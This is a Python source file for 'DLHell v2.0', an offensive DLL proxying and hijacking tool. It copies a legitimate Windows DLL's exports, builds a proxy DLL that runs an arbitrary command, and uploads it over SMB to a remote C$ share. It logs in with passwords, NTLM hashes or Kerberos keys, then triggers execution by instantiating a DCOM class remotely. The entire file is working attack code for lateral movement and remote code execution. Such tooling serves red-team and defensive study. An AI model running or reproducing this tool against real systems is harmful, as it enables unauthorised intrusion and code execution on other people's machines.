#!/usr/bin/python3
import argparse
import subprocess
import sys
from os import rename,mkdir
from pathlib import Path
import shutil
import pefile
import json
from getpass import getpass
from impacket.smbconnection import SMBConnection
from impacket.examples.utils import parse_target
from impacket.examples.smbclient import MiniImpacketShell
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom.oaut import IID_IDispatch, string_to_bin, IDispatch

WORDS = []

BANNER = """
 ____  _     _   _      _ _
|  _ \| |   | | | | ___| | |
| | | | |   | |_| |/ _ \ | |
| |_| | |___|  _  |  __/ | |
|____/|_____|_| |_|\___|_|_|
"""

def success(skk): print("\033[92m {}\033[00m" .format(skk))
def error(skk): print("\033[91m {}\033[00m" .format(skk))

def parse_progid(progid):
    """## Parses ProgID from dcom.json and retrieves hijack information

    ### Args:
        - `progid (str)`: Target ProgID

    ### Returns:
        - `tuple`: Hijack information
    """
    with open("dcom.json","r",encoding="utf-8") as f:
        data = json.loads(f.read())

        for item in data:
            if item["progid"] == progid:
                clsid = item["clsid"]
                remote_lib = item["remotelib"]
                remote_target = item["remotetarget"]

                if "{" in item["remotetarget"] and "}" in item["remotetarget"]:
                    need_user = True
                else:
                    need_user = False
                return clsid, remote_lib, remote_target, need_user

        error("ProgID not found")
        sys.exit(1)

def parse_clsid(clsid):
    """## Parses CLSID from dcom.json and retrieves hijack information

    ### Args:
        - `clsid (json)`: Target CLSID

    ### Returns:
        - `tuple`: Hijack information
    """
    with open("dcom.json","r",encoding="utf-8") as f:
        data = json.loads(f.read())

        for item in data:
            if item["clsid"] == clsid:
                remote_lib = item["remotelib"]
                remote_target = item["remotetarget"]

                if "{" in item["remotetarget"] and "}" in item["remotetarget"]:
                    need_user = True
                else:
                    need_user = False

                return clsid, remote_lib, remote_target, need_user

        error("CLSID not found")
        sys.exit(1)

def instantiate(dcom, clsid):
    """## Instantiates a DCOM Class

    ### Args:
        - `dcom (DCOMConnection)`: Impacket DCOM connection object
        - `clsid (str)`: CLSID to instantiate
    """
    print("Instantiating remote class...")
    try:
        dcom.CoCreateInstanceEx(string_to_bin(clsid), IID_IDispatch)
    except Exception:
        success(f"[+] Instantiated CLSID {clsid}")
        pass

def check_function_name(name):
    """## Returns True if exported function name is valid

    ### Args:
        - `name (str)`: Exported function name

    ### Returns:
        - `Bool`: True if name valid
    """
    for word in WORDS:
        if word in name:
            return False
    return True

def compile_library(library):
    """## Compiles the source_lib to library

    ### Args:
        - `library (str)`: Library name (without extension)
    """

    library_path = library.split(".dll")[0]
    library_name = str(Path(library).name).split(".dll", maxsplit=1)[0]

    try:
        print(f"Compiling {library_name}.cpp")
        subprocess.run([
            "/usr/bin/x86_64-w64-mingw32-g++-win32",
            "-shared",
            "-o",
            f"{library_path}/{library_name}.dll",
            f"{library_path}/{library_name}.cpp",
            f"{library_path}/{library_name}.def",
            "-s","-DUNICODE","-D_UNICODE"], 
            capture_output=True,
            check=False)
    except subprocess.CalledProcessError as e:
        error(f"[-] Error compiling {library_name}")
        error(e.stderr.decode("utf-8"))
        sys.exit(1)
    except FileNotFoundError:
        error("[-] x86_64-w64-mingw32-g++-win32 is not installed, please install g++-mingw-w64 and mingw-w64")
        sys.exit(1)
    success(f"[+] Successfuly compiled {library_path}/{library_name}.cpp to {library_path}/{library_name}.dll")

def write_hijack_lib(template, command, library, dll_orig, functions):
    """## Writes command in hijack_lib using template

    ### Args:
        - `template (str)`: Template file name
        - `command (str)`: Command to execute
        - `library (str)`: Library_to_hijack
        - `dll_orig (str)`: Renamed original library
        - `functions (list)`: Functions to export
    """

    print("Writing proxy library source")

    library_name = str(Path(library).name).split(".dll",maxsplit=1)[0]
    library_path = library.split(".dll")[0]
    dll_orig = dll_orig.split(".dll")[0]

    with open(template, "r", encoding="utf-8") as f1:
        data = f1.read()
        data = data.replace("{command}",command)
        with open(f"{library_path}/{library_name}.cpp","w", encoding="utf-8") as f2:
            for function in functions:
                name = function['name']
                dll_orig = function['dll_orig']
                ordinal = function['ordinal']
                f2.write(f'#pragma comment(linker,"/export:{name}={dll_orig}.{name},@{ordinal}")\n')
            f2.write(data)
            success(f"[+] {library_path}/{library_name}.cpp written !\n")
    print("\n")

def dump_exported_functions(library, dll_orig):
    """## Retrives exported function from a library

    ### Args:
        - `library (str)`: Library_to_hijack
        - `dll_orig (str)`: Renamed original library

    ### Returns:
        - `dict`: Dict(name,dll_orig,ordinal)
    """
    print("Parsing exported functions")

    functions = []

    d = [pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]]
    try:
        pe = pefile.PE(f"{library}", fast_load=True)
    except FileNotFoundError:
        error("Library not found")
        sys.exit(1)
    pe.parse_data_directories(directories=d)

    exports = [(e.ordinal, e.name) for e in pe.DIRECTORY_ENTRY_EXPORT.symbols]
    if len(exports) > 0:
        for export in sorted(exports):
            ordinal, name = export
            if ordinal is None or name is None:
                break
            name = name.decode()
            if check_function_name(name):
                success(f"[+] Exporting {name}")
                dll_orig = dll_orig.split(".dll")[0]
                function = {
                    "name": name,
                    "dll_orig": dll_orig,
                    "ordinal": ordinal
                }
                functions.append(function)
    print("\n")
    return functions

def list_dcom():
    """## Prints available ProgIDs & CLSID
    """
    print("Available ProgIDs and CLSIDs for DLL Hijacking:")
    with open("dcom.json", "r", encoding="utf-8") as f:
        data = json.loads(f.read())

        for item in data:
            if item["progid"] == "":
                clsid = item["clsid"]
                print(f"- (CLSID)  {clsid} ")
            else:
                progid = item["progid"]
                print(f"- (ProgID) {progid}")

def parse_handler():
    """## _summary_

    ### Returns:
        - `_type_`: _description_
    """    

    parser = argparse.ArgumentParser(description="DLL Hell - DLL Proxifier/Hijacker")

    parser.add_argument("-local-lib", help="Path of the remote library on the local system, ex: version.dll", required=False)
    parser.add_argument("-remote-lib", help="Path of the library on the remote system, ex: windows/system32/version.dll. WARNING: Will connect using SMB on C$ share. Admin rights needed. Requires -target", required=False)
    parser.add_argument("-local-target", help="The new name of the local output proxyfied library", required=False)
    parser.add_argument("-remote-target", help="The new name of the remote proxyfied library. WARNING: Will connect using SMB on C$ share. Admin rights needed. Requires -target", required=False)
    parser.add_argument("-target", help="[[domain/]username[:password]@]<targetName or address>", required=False)
    parser.add_argument("-clsid", help="CLSID of DCOM class to activate", required=False)
    parser.add_argument("-progid", help="ProgID of DCOM class to activate", required=False)
    parser.add_argument("-t","-template", help="Template file to use for lib generation", required=True)
    parser.add_argument("-c","-command", help="Command to execute using hijacked lib", required=True)
    parser.add_argument("-u","-user", help="Name of the user to hijack (used to put DLLs in localappdata folder)", required=False)
    parser.add_argument("-l","-list", action="store_true", help="Lists vulnerable CLSID & ProgID for DCOM Hijacking", required=False)

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on target parameters. If valid credentials '
                                                       'cannot be found, it will use the ones specified in the command '
                                                       'line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                            'the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')

    args = parser.parse_args()

    if args.l is True:
        list_dcom()
        sys.exit(0)

    if len(args.c) == 0:
        error("Command must not be an empty string")
        sys.exit(1)

    if args.progid is not None:
        out = parse_progid(args.progid)
        if out is not None:
            args.clsid, args.remote_lib, args.remote_target, need_user = out
        if need_user is True:
            if args.u is None:
                error("Must specify -u when using this Class")
                sys.exit(1)
            else:
                args.remote_target = args.remote_target.format(user=args.u)

    if args.clsid is not None:
        out = parse_clsid(args.clsid)
        if out is not None:
            args.clsid, args.remote_lib, args.remote_target, need_user = out
        if need_user is True:
            if args.u is None:
                error("Must specify -u when using this Class")
                sys.exit(1)
            else:
                args.remote_target = args.remote_target.format(user=args.u)

    if args.local_lib is None and args.remote_lib is None:
        error("Must specify -local-lib or -remote-lib")
        parser.print_help()
        sys.exit(1)

    if args.local_lib is not None and args.remote_lib is not None:
        error("Cannot specify -local-lib and -remote-lib")
        parser.print_help()
        sys.exit(1)

    if args.local_target is None and args.remote_target is None:
        error("Must specify -local-target or -remote-target")
        parser.print_help()
        sys.exit(1)

    if args.local_target is not None and args.remote_target is not None:
        error("Cannot specify -local-target and -remote-target")
        parser.print_help()
        sys.exit(1)

    if args.remote_lib is not None and args.target is None:
        error("Must specify -target with -remote-lib")
        parser.print_help()
        sys.exit(1)

    if args.remote_target is not None and args.target is None:
        error("Must specify -target with -remote-target")
        parser.print_help()
        sys.exit(1)

    if args.clsid is not None and args.target is None:
        error("Must specify -target with -clsid")
        parser.print_help()
        sys.exit(1)
    return args

def gen_def(functions,library,dll_orig):
    """## Generates def file for Linker

    ### Args:
        - `functions (list)`: List of exported functions
        - `library (str)`: Original library
        - `dll_orig (str)`: Hijacked library
    """
    print("Creating def file")

    library = library.split(".dll")[0]
    dll_orig = dll_orig.split(".dll")[0]

    with open(f"lib/{library}/{library}.def", "w", encoding="utf-8") as f:
        f.write("EXPORTS\n")
        for function in functions:
            f.write(f"{function['name']}={dll_orig}.{function['name']} @{function['ordinal']}\n")
    success(f"[+] Successfuly written {len(functions)} to def file")
    print("\n")

def fetch_lib(shell, remote_lib):
    """## Downloads library from remote host

    ### Args:
        - `shell (MiniImpacketShell)`: Impacket mini SMB shell object
        - `remote_lib (str)`: Library name
    """
    success(f"[+] Fetching {remote_lib}")
    try:
        shell.onecmd("use c$")
        shell.onecmd(f"get {remote_lib}")

        remote_file = str(Path(remote_lib).name)

        rename(f"{remote_file}",f"lib/{remote_file}")
    except Exception as e:
        print("Error: Cannot fetch file from remote host")
        error(str(e))
    print("\n")

def put_lib(shell, remote_path, remote_file):
    """## Uploads libary to remote host

    ### Args:
        - `shell (MiniImpacketShell)`: Impacket mini SMB shell object
        - `remote_path (str)`: Remote path
        - `remote_file (str)`: Remote file name
    """
    success(f"[+] Putting {remote_path}/{remote_file.split('/')[-1]}")

    commands = []

    commands.append("use c$")
    commands.append(f"cd {remote_path}")
    commands.append(f"put {remote_file}")

    try:
        for command in commands:
            out = shell.onecmd(command)
            if out is False:
                print(f"    Error doing command : {command}")
    except Exception as e:
        print("Error: Cannot put file to remote host")
        print(str(e))

def main():
    """## DLHell Main function
    """    
    print(BANNER)
    print("DLHell v2.0\n")

    args = parse_handler()

    doKerberos = False

    if args.target is not None:
        domain, username, password, address = parse_target(args.target)

        if args.target_ip is None:
            args.target_ip = address

        if domain is None:
            domain = ''

        if password == '' and username != '' and args.hashes is None and args.no_pass is False and args.aesKey is None:

            password = getpass("Password:")

        if args.aesKey is not None:
            args.k = True

        if args.hashes is not None:
            lmhash, nthash = args.hashes.split(':')
        else:
            lmhash = ''
            nthash = ''

        try:
            print("Attempting SMB Connection")
            smbClient = SMBConnection(address, args.target_ip, sess_port=int(args.port))

            if args.k is True:
                smbClient.kerberosLogin(username, password, domain, lmhash, nthash, args.aesKey, args.dc_ip )
            else:
                smbClient.login(username, password, domain, lmhash, nthash)

            shell = MiniImpacketShell(smbClient)


            if args.remote_lib is not None: 
                print("Fetching remote library")
                fetch_lib(shell, args.remote_lib)

                library = args.remote_lib.split("/")[-1]
                library = f"lib/{library}"
                dll_orig = args.remote_target.split("/")[-1]
            else:
                library = args.local_lib
                dll_orig = args.local_target

        except Exception as e:
            error(str(e))
            sys.exit(1)
    else:
        library = args.local_lib
        dll_orig = args.local_target

    #Dumps exported function from legit DLL using winedump
    functions = dump_exported_functions(library,dll_orig)

    if len(functions) == 0:
        error("No function exported... Exiting")
        sys.exit(1)

    library_file = str(Path(library).name).split(".dll", maxsplit=1)[0]
    dll_orig_file = str(Path(dll_orig).name).split(".dll", maxsplit=1)[0]

    #Removes previous hijacked dll
    try:
        shutil.rmtree(f"lib/{library_file}")
    except FileNotFoundError:
        pass
    try:
        mkdir(f"lib/{library_file}")
    except Exception as e:
        error(e)
        sys.exit(1)

    #Generate def file for mingw linker
    gen_def(functions,library_file,dll_orig_file)

    #Writes hijacked lib using template file and custom command to execute by proxying exported functions from legit DLL
    write_hijack_lib(args.t,args.c,library,dll_orig,functions)

    library_name = library.split(".")[0]

    #backups the original dll
    shutil.copyfile(f"{library}",f"{library_name}/{dll_orig}")

    #Compiles the final DLL file using the name of the legit DLL
    compile_library(library)

    library_path = library.split(".dll")[0]
    library_name = str(Path(library).name).split(".dll", maxsplit=1)[0]

    if args.remote_target is not None:
        remote_path = str(Path(args.remote_target).parent)

        print("Putting libraries to remote target")

        put_lib(shell, remote_path, f"{library_path}/{library_name}.dll")
        put_lib(shell, remote_path, f"{library_path}/{dll_orig_file}.dll")

        print("\n")
        if args.clsid is not None or args.progid is not None:
            doKerberos = args.k

            dcom = DCOMConnection(address, username, password, domain, lmhash, nthash, args.aesKey, oxidResolver=True, doKerberos=doKerberos, kdcHost=args.dc_ip)

            if args.clsid is not None:
                #Instantiate Class on remote target
                instantiate(dcom,args.clsid)
            elif args.progid is not None:
                instantiate(dcom,args.progid)
    else:
        print(f"Place {library_path}/{library_name}.dll and {library_path}/{dll_orig_file}.dll in the target folder")

if __name__ == '__main__':
    main()
